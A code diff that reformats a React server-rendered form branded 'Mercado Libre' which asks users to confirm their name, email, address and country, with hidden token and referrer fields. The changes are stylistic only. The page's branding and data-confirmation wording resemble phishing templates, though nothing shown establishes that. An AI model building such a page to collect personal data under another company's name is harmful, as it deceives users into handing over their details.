@@ -1,4 +1,4 @@
-import React from 'react';
+import React from "react";
 
 interface Locale {
   country: string;
@@ -24,17 +24,22 @@ export interface SSRFormProps {
 }
 
 export function SSRForm({ user, countries, referrer, token, locale, translations }: SSRFormProps) {
-      const lang = locale?.lang.split('-')[0] || 'es';
-    const t = translations || { title: 'Confirma tus datos', subtitle: 'Formulario', loading: 'Cargando...' };
-  
-    return (
-      <html lang={lang}>
-        <head>
-          <meta charSet="UTF-8" />
-          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-          <title>{t.title} - Mercado Libre</title>
-        <style dangerouslySetInnerHTML={{
-          __html: `
+  const lang = locale?.lang.split("-")[0] || "es";
+  const t = translations || {
+    title: "Confirma tus datos",
+    subtitle: "Formulario",
+    loading: "Cargando...",
+  };
+
+  return (
+    <html lang={lang}>
+      <head>
+        <meta charSet="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>{t.title} - Mercado Libre</title>
+        <style
+          dangerouslySetInnerHTML={{
+            __html: `
             body {
               margin: 0;
               background-color: #f9fafb;
@@ -122,8 +127,9 @@ export function SSRForm({ user, countries, referrer, token, locale, translations
             button:hover {
               background-color: #1e40af;
             }
-          `
-        }} />
+          `,
+          }}
+        />
       </head>
       <body>
         <header>
@@ -138,46 +144,31 @@ export function SSRForm({ user, countries, referrer, token, locale, translations
         <main>
           <div className="form-container">
             <h2>{t.title}</h2>
-            <form method="POST" action="/verify-data-ssr">
+            <form method="POST" action="/verify-data-ssr" id="ssr-form">
               <input type="hidden" name="referrer" value={referrer} />
               <input type="hidden" name="token" value={token} />
 
               <div>
                 <label>Nombre</label>
-                <input 
-                  type="text" 
-                  name="name" 
-                  defaultValue={user.name} 
-                  required 
-                />
+                <input type="text" name="name" defaultValue={user.name} required />
               </div>
 
               <div>
                 <label>Email</label>
-                <input 
-                  type="email" 
-                  name="email" 
-                  defaultValue={user.email} 
-                  required 
-                />
+                <input type="email" name="email" defaultValue={user.email} required />
               </div>
 
               <div>
                 <label>Dirección</label>
-                <input 
-                  type="text" 
-                  name="address" 
-                  defaultValue={user.address} 
-                  required 
-                />
+                <input type="text" name="address" defaultValue={user.address} required />
               </div>
 
               <div>
                 <label>País</label>
                 <select name="country" required>
-                  {countries.map(country => (
-                    <option 
-                      key={country.code} 
+                  {countries.map((country) => (
+                    <option
+                      key={country.code}
                       value={country.code}
                       {...(user.country === country.code && { selected: true })}
                     >
@@ -193,4 +184,4 @@ export function SSRForm({ user, countries, referrer, token, locale, translations
       </body>
     </html>
   );
-} 
+}
